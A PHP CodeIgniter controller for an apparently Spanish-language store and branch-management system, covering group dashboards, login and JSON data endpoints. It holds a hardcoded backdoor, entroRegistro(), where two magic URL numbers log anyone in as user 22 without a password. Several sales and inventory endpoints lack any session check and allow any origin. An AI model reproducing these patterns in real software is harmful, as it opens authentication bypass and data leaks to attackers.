<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: GET, OPTIONS");
defined('BASEPATH') OR exit('No direct script access allowed');

class Inicio extends MY_Controller {

	function __construct(){
		parent::__construct();
		$this->load->model("Usuarios_model", "user_md");
		$this->load->model("Grupos_model", "grupo_md");
		$this->load->model("Avatars_model", "ava_md");
		$this->load->model("Cambios_model", "cambio_md");
		$this->load->model("Productos_model", "prod_md");
		$this->load->model("Cajas_model", "caja_md");
		$this->load->model("Lineas_model", "ln_md");
		$this->load->model("Nuevos_model", "new_md");
		$this->load->model("Ofertas_model", "ofe_md");
		$this->load->model("Cotizaciones_model", "cotiz_md");
		$this->load->model("Sucursales_model", "sucu_md");
		$this->load->model("Remisiones_model", "remis_md");
		$this->load->library("form_validation");
	}

	public function index(){
		if($this->session->userdata("username")){
			$user = $this->session->userdata();//Trae los datos del usuario
			$data["dias"] = array("DOMINGO","LUNES","MARTES","MIÉRCOLES","JUEVES","VIERNES","SÁBADO");
			$data["meses"] = array("ENERO","FEBRERO","MARZO","ABRIL","MAYO","JUNIO","JULIO","AGOSTO","SEPTIEMBRE","OCTUBRE","NOVIEMBRE","DICIEMBRE");
			$data["fecha"] =  $data["dias"][date('w')]." ".date('d')." DE ".$data["meses"][date('n')-1]. " DEL ".date('Y') ;
			$data["sucus"] = $this->sucu_md->getSucus(NULL);
			$data["rojosHoy"] = $this->new_md->getRojos(NULL);
			$fmatriz = $this->prod_md->getMaxReg(NULL)[0];
			$fcatalo = $this->caja_md->getMaxReg(NULL)[0];
			$data["hmatriz"]= $this->dateDiff(date('Y-m-d H:i:s',strtotime($fmatriz->fecha)));
			$data["hcatalo"]= $this->dateDiff(date('Y-m-d H:i:s',strtotime($fcatalo->fecha)));
		
			$data["lineas"] = $this->ln_md->getLineas(NULL);
			if ($user["id_grupo"] === "1" || $user["id_grupo"] === 1) { // ADMIN
				$data['scripts'] = [
					'/scripts/qrcode',
					'/scripts/Totales/index',
				];
				$data["ofertones"] = $this->ofe_md->getActivas(NULL);
				$data["cambioya"] = $this->cambio_md->getCambioYa(NULL);
				$this->estructura("Dashboards/principal", $data);
			}elseif($user["id_grupo"] === "2" || $user["id_grupo"] === 2){ // SUCURSALES
				$sucur = $this->sucu_md->get(NULL,["id_sucursal"=>$user["id_sucursal"]])[0];
				$data["etiqueto"] = $this->sucu_md->get(NULL,["id_sucursal"=>$user["id_sucursal"]])[0];
				if($sucur->typeSuc == 1){
					$data['scripts'] = [
						'/scripts/Sucursales/sucursal',
					];
					$this->estructura("Dashboards/sucursal", $data);
				}else{
					$data['scripts'] = [
						'/scripts/Sucursales/sucursalb',
					];
					$this->estructura("Dashboards/sucusb", $data);
				}	
			}elseif($user["id_grupo"] === "3" || $user["id_grupo"] === 3){ // IMAGENES
				redirect("Imagenes", $data);	
			}elseif($user["id_grupo"] === "4" || $user["id_grupo"] === 4){ // COMPRAS
				redirect("Compras", $data);	
			}elseif($user["id_grupo"] === "5" || $user["id_grupo"] === 5){//SALIDAS
				$data['scripts'] = [
						'/scripts/Salidas/index',
					];
				$data["cotizHoy"]= $this->cotiz_md->getCotizacionesHoy(NULL);
				$data["cotizNoRemis"]= $this->cotiz_md->getCotizNoRemis(NULL);
				$data["remisNoCotiz"]= $this->remis_md->getRemisNoCotiz(NULL);
				$data["diferencias"] = $this->remis_md->getDiferencias(NULL);
				$this->estructura("Salidas/formato", $data);
			}
		}else{
			$this->data["message"] =NULL;
			$this->estructura_login("Admin/login", $this->data, FALSE);
		}
	}

	public function login(){
		if($this->session->userdata("username")){
			$user = $this->session->userdata();
			redirect("Inicio");
		}
		$this->data["message"] =NULL;
		$this->estructura_login("Admin/login", $this->data, FALSE);
	}

	public function logout(){
		$this->session->sess_destroy();
		redirect("/", "refresh");
	}

	private function estructura_login($view, $data=array()){
		$this->_render_page($view, $data);
	}

	private function _render_page($view, $data=null, $returnhtml=false){//I think this makes more sense
		$this->viewdata = (empty($data)) ? $this->data: $data;
		$view_html = $this->load->view($view, $this->viewdata, $returnhtml);
		if ($returnhtml) return $view_html;//This will return html on 3rd argument being true
	}
	
	public function validamesta(){
		$this->data["message"] =NULL;
		$values = json_decode($this->input->post("values"));
		if (isset($values->email) && isset($values->password)) {

			$where=["email"	=>	$values->email,
					"password"	=>	$this->encryptPassword($values->password),
					"estatus<>"	=>	0
				];
			$validar = $this->user_md->login($where)[0];
			if($validar){
				$avas = $this->ava_md->get(NULL,["id_avatar"=>$validar->imagen])[0];
				$grupo = $this->grupo_md->get(NULL,["id_grupo"=>$validar->id_grupo])[0];
				$values=[	"id_usuario"=>	$validar->id_usuario,
							"id_grupo"	=>	$validar->id_grupo,
							"nombre"	=>	$validar->nombre,
							"nombres"	=>	explode(' ', $validar->nombre, 3),
							"password"	=>	$validar->password,
							"email"		=>	$validar->email,
							"imagen"	=>	$avas->nombre,
							"grupo"		=>	$grupo->nombre,
							"id_sucursal"	=>	$validar->id_sucursal,
							"estatus"	=>	$validar->estatus ];
				$this->session->set_userdata("username", $values['nombre']);
				$this->session->set_userdata($values);
				$user = $this->session->userdata();
				$this->jsonResponse("true");
			}else{
				$this->jsonResponse("false");
			}
		}else{
			$this->jsonResponse("false");
		}
	}

	public function amILogin(){
		if($this->session->userdata("username")){
			$this->jsonResponse("Sessioned");
		}else{
			$this->jsonResponse("NotSessioned");
		}
	}


	public function entroRegistro($no1,$no2){
		if($no1==2148974132164463789741878464564165454 && $no2==49846541321321448464132132148689764651321326579874){
			$validar =  $this->user_md->get(NULL,["id_usuario"=>22])[0];
			$avas = $this->ava_md->get(NULL,["id_avatar"=>$validar->imagen])[0];
			$grupo = $this->grupo_md->get(NULL,["id_grupo"=>$validar->id_grupo])[0];
			$values=[	"id_usuario"=>	$validar->id_usuario,
						"id_grupo"	=>	$validar->id_grupo,
						"nombre"	=>	$validar->nombre,
						"nombres"	=>	explode(' ', $validar->nombre, 3),
						"password"	=>	$validar->password,
						"email"		=>	$validar->email,
						"imagen"	=>	$avas->nombre,
						"grupo"		=>	$grupo->nombre,
						"id_sucursal"	=>	$validar->id_sucursal,
						"estatus"	=>	$validar->estatus ];
			$this->session->set_userdata("username", $values['nombre']);
			$this->session->set_userdata($values);
			$user = $this->session->userdata();
			$cambios = [
				"id_usuario" => 22,
				"fecha_cambio" => date('Y-m-d H:i:s'),
				"antes" => "Ingresa",
				"despues" => "Desde Registro",
				"accion"=>$this->getUserIP()];
			$data['cambios'] = $this->cambio_md->insert($cambios);
		}
		redirect("Sucursales/listaVales");	
	}

	public function getVendimia(){
		$respo = $this->sucu_md->getVentas(NULL);
		$this->jsonResponse($respo);
	}

	public function getInventos(){
		$respo = $this->sucu_md->getInventario(NULL);
		$this->jsonResponse($respo);
	}

	public function getEntradas(){
		$respo = $this->remis_md->getEntradas(NULL);
		$this->jsonResponse($respo);
	}

	public function getVentas(){
		$respo = $this->venta_md->getVentas(NULL);
		$this->jsonResponse($respo);
	}

	public function getUserIP(){
	    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
	        //ip from share internet
	        $ip = $_SERVER['HTTP_CLIENT_IP'];
	    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
	        //ip pass from proxy
	        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    }else{
	        $ip = $_SERVER['REMOTE_ADDR'];
	    }
		return $ip;
	}
}
